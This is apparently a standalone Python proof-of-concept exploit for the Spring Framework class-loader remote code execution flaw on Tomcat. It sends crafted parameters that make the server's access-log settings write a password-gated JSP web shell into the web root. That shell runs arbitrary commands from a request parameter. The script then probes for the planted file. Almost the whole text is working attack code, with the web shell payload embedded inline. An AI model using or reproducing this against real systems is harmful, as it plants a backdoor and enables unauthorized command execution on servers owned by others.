import time
import requests

def poc(url):
    params={'class.module.classLoader.resources.context.parent.pipeline.first.pattern':'%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i',
            'class.module.classLoader.resources.context.parent.pipeline.first.suffix':'.jsp',
            'class.module.classLoader.resources.context.parent.pipeline.first.directory':'webapps/ROOT',
            'class.module.classLoader.resources.context.parent.pipeline.first.prefix':'tomcatwar',
            'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat':''}
    headers={'suffix':'%>//','c1':'Runtime','c2':'<%','DNT':'1'}
    requests.get(url=url,params=params,headers=headers)

def check(url):
    resp = requests.get(url=url + '/tomcatwar.jsp', )
    if resp.status_code == 200:
        print("It has SpringRCE!!")
        exit(0)
    print("It may not have SpringRCE")


if __name__ == '__main__':
    url=input("please input url you want to check:")
    poc(url)
    time.sleep(0.5)
    check(url)